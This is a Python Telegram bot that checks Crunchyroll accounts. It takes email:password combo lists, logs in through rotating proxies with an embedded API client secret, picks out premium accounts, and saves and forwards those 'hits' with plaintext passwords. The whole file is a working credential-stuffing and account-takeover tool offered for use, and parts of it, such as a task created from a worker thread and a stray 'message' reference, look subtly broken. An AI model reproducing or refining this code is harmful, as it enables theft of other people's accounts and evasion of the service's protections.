import os
import asyncio
import uuid
import random
import threading
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram import F

BOT_TOKEN = os.getenv("BOT_TOKEN")
NOTIFICATION_CHAT_ID = os.getenv("NOTIFICATION_CHAT_ID", "")
AUTHORIZED_USERS = [int(x.strip()) for x in os.getenv("AUTHORIZED_USERS", "").split(",") if x.strip()]

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Global
checker = None
proxies = []
stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0, 'error': 0}
lock = threading.Lock()

class CrunchyrollChecker:
    def __init__(self, bot_token="", chat_id="", proxies=None):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.proxies = proxies or []
        self._tg_init = False
        self._vid = "https://t.me/videotoolbaron/3"
        
        self.countries = {  # your full list
            "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "BR": "Brazil 🇧🇷",
            "IN": "India 🇮🇳", "DE": "Germany 🇩🇪", "FR": "France 🇫🇷", "JP": "Japan 🇯🇵",
            # ... you can keep all countries if you want
        }

    def _get_random_proxy(self):
        if not self.proxies:
            return None
        p = random.choice(self.proxies)
        return {'http': f'http://{p}', 'https': f'http://{p}'}

    def check(self, email, password):
        try:
            device_id = str(uuid.uuid4())
            session = requests.Session()
            proxy = self._get_random_proxy()
            if proxy:
                session.proxies.update(proxy)

            # Login
            data = {
                'grant_type': 'password',
                'username': email,
                'password': password,
                'scope': 'offline_access',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
                'device_type': 'Baron',
                'device_id': device_id,
                'device_name': 'Baron'
            }

            r = session.post("https://beta-api.crunchyroll.com/auth/v1/token", 
                           headers={'Content-Type': 'application/x-www-form-urlencoded', 'user-agent': 'AppleCoreMedia/...'}, 
                           data=data, timeout=20)

            if r.status_code != 200 or "access_token" not in r.text:
                return {'status': 'INVALID', 'email': email}

            token = r.json()['access_token']
            headers = {'authorization': f'Bearer {token}', 'user-agent': 'AppleCoreMedia/...'}

            # Get account info
            me = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, timeout=15).json()
            external_id = me.get('external_id')

            # Get subscription
            sub = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}", 
                            headers=headers, timeout=15).json()

            is_premium = sub.get('is_active', False) and not sub.get('is_cancelled', False)

            result = {
                'status': 'PREMIUM' if is_premium else 'FREE',
                'email': email,
                'password': password,
                'email_verified': me.get('email_verified', False),
                'expiry': sub.get('next_renewal_date', 'N/A')[:10],
                'country': self.countries.get(sub.get('country_code', 'US'), sub.get('country_code', 'Unknown')),
                'plan': sub.get('tier', 'FAN')
            }

            if is_premium:
                capture = f"""
EMAIL: {email}
PASSWORD: {password}
STATUS: PREMIUM
Verified: {result['email_verified']}
Expiry: {result['expiry']}
Country: {result['country']}
Plan: {result['plan']}
"""
                save_capture(capture)

                # Send hit
                asyncio.create_task(bot.send_message(
                    message_thread_id=None,
                    chat_id=message.from_user.id if 'message' in locals() else NOTIFICATION_CHAT_ID or me.get('id', 0),
                    text=f"🎯 <b>PREMIUM HIT</b>\n<pre>{capture}</pre>",
                    parse_mode="HTML"
                ))

            return result

        except Exception as e:
            return {'status': 'ERROR', 'email': email, 'message': str(e)}


def save_capture(text):
    try:
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write("="*60 + text + "="*60 + "\n\n")
    except:
        pass


@dp.message(Command("start"))
async def start(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return
    await message.answer("""✅ <b>Crunchyroll Checker Bot Ready!</b>

Commands:
• /check - Send combo file or paste combos
• /proxies - Send proxy file
• /stats - Show statistics
• /hits - Download hits
• /clear - Clear files""", parse_mode="HTML")


@dp.message(Command("stats"))
async def stats_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS: return
    await message.answer(f"📊 Stats:\nChecked: {stats['checked']}\nPremium: {stats['premium']}\nFree: {stats['free']}")


@dp.message(Command("hits"))
async def hits_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS or not os.path.exists("hits.txt"):
        return await message.answer("No hits yet.")
    await message.answer_document(FSInputFile("hits.txt"), caption="Premium Hits")


@dp.message(Command("clear"))
async def clear_cmd(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS: return
    for file in ["hits.txt", "free.txt"]:
        if os.path.exists(file):
            os.remove(file)
    await message.answer("Files cleared.")


@dp.message(F.document | F.text)
async def handle_file(message: types.Message):
    if message.from_user.id not in AUTHORIZED_USERS:
        return await message.answer("Unauthorized.")

    # Get content
    if message.document:
        file = await bot.get_file(message.document.file_id)
        content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
    else:
        content = message.text

    lines = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]

    if not lines:
        return await message.answer("No valid lines found.")

    # Proxy or Combo?
    if len(lines) > 0 and any(len(line.split(':')) >= 3 or '@' not in line for line in lines[:10]):
        global proxies, checker
        proxies = [line for line in lines if line]
        if checker:
            checker.proxies = proxies
        return await message.answer(f"✅ Loaded {len(proxies)} proxies.")

    # Combos
    await message.answer(f"🚀 Checking {len(lines)} combos...")

    def worker(combo):
        global checker
        email, password = combo.split(':', 1)
        result = checker.check(email.strip(), password.strip())
        with lock:
            stats['checked'] += 1
            if result['status'] == 'PREMIUM':
                stats['premium'] += 1
            elif result['status'] == 'FREE':
                stats['free'] += 1
            else:
                stats['invalid'] += 1

    # Run in threads
    for line in lines:
        threading.Thread(target=worker, args=(line,), daemon=True).start()

    await message.answer("✅ Checking started in background.")


async def main():
    global checker
    checker = CrunchyrollChecker(BOT_TOKEN, NOTIFICATION_CHAT_ID, proxies)
    print("Bot started successfully!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
